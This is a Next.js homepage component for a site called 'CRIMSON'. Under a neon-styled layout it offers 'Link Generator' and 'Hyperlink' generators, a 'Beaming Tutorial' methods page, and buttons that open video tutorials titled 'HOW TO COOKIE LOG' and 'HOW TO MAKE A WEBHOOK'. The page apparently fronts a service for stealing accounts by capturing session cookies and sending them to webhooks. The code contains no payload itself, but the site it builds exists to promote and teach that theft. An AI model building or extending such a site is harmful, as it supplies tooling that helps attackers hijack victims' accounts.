"use client"

import { SectionWrapper } from "@/components/section-wrapper"
import { DiscordButton } from "@/components/discord-button"
import { GeneratorCard } from "@/components/generator-card"
import { TutorialCard } from "@/components/tutorial-card"
import { ToolButton } from "@/components/tool-button"
import { FooterSection } from "@/components/footer-section"
import { FloatingActionButtons } from "@/components/floating-action-buttons"
import { ParticleSystem } from "@/components/particle-system"
import { DeviceSelectionDialog } from "@/components/device-selection-dialog"
import { ArrowLeft, ArrowRight, Star, Sparkles } from "lucide-react"
import Link from "next/link"
import { useEffect, useState } from "react"
import { BackgroundMusic } from "@/components/background-music"

export default function HomePage() {
  const [isLoaded, setIsLoaded] = useState(false)
  const [isDialogOpen, setIsDialogOpen] = useState(false)
  const [selectedTutorial, setSelectedTutorial] = useState<"webhook" | "cookie" | null>(null)

  useEffect(() => {
    setIsLoaded(true)
  }, [])

  const handleTutorialClick = (tutorialType: "webhook" | "cookie") => {
    setSelectedTutorial(tutorialType)
    setIsDialogOpen(true)
  }

  const handleDeviceSelect = (device: "ios" | "android" | "pc") => {
    if (selectedTutorial === "cookie") {
      // Navigate to specific Streamable URLs for cookie log tutorials
      const urls = {
        ios: "https://streamable.com/dq8b82",
        android: "https://streamable.com/fgmhpd",
        pc: "https://streamable.com/ajao1g",
      }
      window.open(urls[device], "_blank")
    } else if (selectedTutorial === "webhook") {
      // Navigate to specific YouTube URLs for webhook tutorials
      const urls = {
        ios: "https://youtube.com/shorts/_n_5IbyH4Hc?si=2AanQXvBPld-zyRP",
        android: "https://youtu.be/9oClR9rlkIc?si=CcNwtmEbXeZYLo8d",
        pc: "https://youtu.be/VdnqbynCH1o?si=mJJSuxQvVxAl7h2I",
      }
      window.open(urls[device], "_blank")
    }

    setIsDialogOpen(false)
    setSelectedTutorial(null)
  }

  return (
    <div className="relative w-full min-h-screen overflow-hidden bg-crimson-black flex flex-col items-center">
      {/* Particle System */}
      <ParticleSystem />

      {/* Star-field video */}
      <video
        className="absolute inset-0 w-full h-full object-cover z-0"
        loop
        autoPlay
        muted
        playsInline
        preload="auto"
        aria-label="Starry night sky background video"
      >
        <source src="/videos/stars.mp4" type="video/mp4" />
        {"Your browser does not support the video tag."}
      </video>

      {/* Main content */}
      <div className="relative z-10 w-full max-w-md mx-auto py-8 px-4 md:px-0">
        {/* Title */}
        <h1
          className={`text-6xl md:text-7xl font-bold text-crimson-neon-red text-center mb-8 neon-text animate-neon-flicker ${
            isLoaded ? "animate-explosive-scale-in" : "opacity-0"
          }`}
        >
          CRIMSON
        </h1>

        {/* Discord button */}
        <div className={isLoaded ? "animate-aggressive-slide-in-left animate-delay-200" : "opacity-0"}>
          <SectionWrapper className="nuclear-glow smooth-transition brutal-hover">
            <DiscordButton />
          </SectionWrapper>
        </div>

        {/* Main generator cards */}
        <div className={isLoaded ? "animate-aggressive-slide-in-right animate-delay-300" : "opacity-0"}>
          <SectionWrapper className="nuclear-glow smooth-transition brutal-hover">
            <h2 className="text-crimson-neon-red text-2xl font-bold mb-4 text-center flex items-center justify-center gap-2 neon-text animate-neon-flicker animate-intense-shimmer">
              <ArrowLeft className="w-6 h-6 animate-aggressive-float" />
              MAIN GENERATOR
              <ArrowRight className="w-6 h-6 animate-aggressive-float" />
            </h2>
            <div className="grid grid-cols-2 gap-4">
              <div className="animate-explosive-scale-in animate-delay-400 brutal-hover">
                <GeneratorCard icon="link" title="Link Generator" />
              </div>
              <div className="animate-explosive-scale-in animate-delay-500 brutal-hover">
                <GeneratorCard icon="hyperlink" title="Hyperlink" />
              </div>
            </div>
          </SectionWrapper>
        </div>

        {/* Tutorial card */}
        <div className={isLoaded ? "animate-aggressive-slide-in-left animate-delay-600" : "opacity-0"}>
          <SectionWrapper className="nuclear-glow smooth-transition brutal-hover">
            <h2 className="text-crimson-neon-red text-2xl font-bold mb-4 text-center flex items-center justify-center gap-2 neon-text animate-neon-flicker animate-intense-shimmer">
              <Sparkles className="w-6 h-6 animate-aggressive-float" />
              Beaming Tutorial
              <Sparkles className="w-6 h-6 animate-aggressive-float" />
            </h2>
            <div className="grid grid-cols-1 gap-4">
              <div className="animate-explosive-scale-in animate-delay-700 brutal-hover">
                <Link href="/methods" passHref legacyBehavior>
                  <TutorialCard icon="book" title="Methods" linkText="View all" />
                </Link>
              </div>
            </div>
          </SectionWrapper>
        </div>

        {/* Tutorials section */}
        <div className={isLoaded ? "animate-explosive-slide-in-up animate-delay-800" : "opacity-0"}>
          <SectionWrapper className="nuclear-glow smooth-transition brutal-hover">
            <h2 className="text-crimson-neon-red text-2xl font-bold mb-4 text-center flex items-center justify-center gap-2 neon-text animate-neon-flicker animate-intense-shimmer">
              <Star className="w-6 h-6 animate-aggressive-float" />
              Tutorials
              <Star className="w-6 h-6 animate-aggressive-float" />
            </h2>
            <div className="grid grid-cols-2 gap-4">
              {/* How to Make Webhook */}
              <div className="animate-explosive-scale-in animate-delay-900 brutal-hover">
                <button onClick={() => handleTutorialClick("webhook")} className="w-full">
                  <ToolButton icon="webhook" title="HOW TO MAKE A WEBHOOK" />
                </button>
              </div>

              {/* How to Cookie Log */}
              <div className="animate-explosive-scale-in animate-delay-[1000ms] brutal-hover">
                <button onClick={() => handleTutorialClick("cookie")} className="w-full">
                  <ToolButton icon="cookie" title="HOW TO COOKIE LOG" />
                </button>
              </div>
            </div>
          </SectionWrapper>
        </div>

        {/* Footer */}
        <div className={isLoaded ? "animate-dramatic-fade-in animate-delay-[1000ms]" : "opacity-0"}>
          <FooterSection />
        </div>
      </div>

      {/* Device Selection Dialog */}
      <DeviceSelectionDialog
        isOpen={isDialogOpen}
        onClose={() => setIsDialogOpen(false)}
        tutorialType={selectedTutorial}
        onDeviceSelect={handleDeviceSelect}
      />

      {/* Floating buttons & background music */}
      <FloatingActionButtons />
      <BackgroundMusic />
    </div>
  )
}
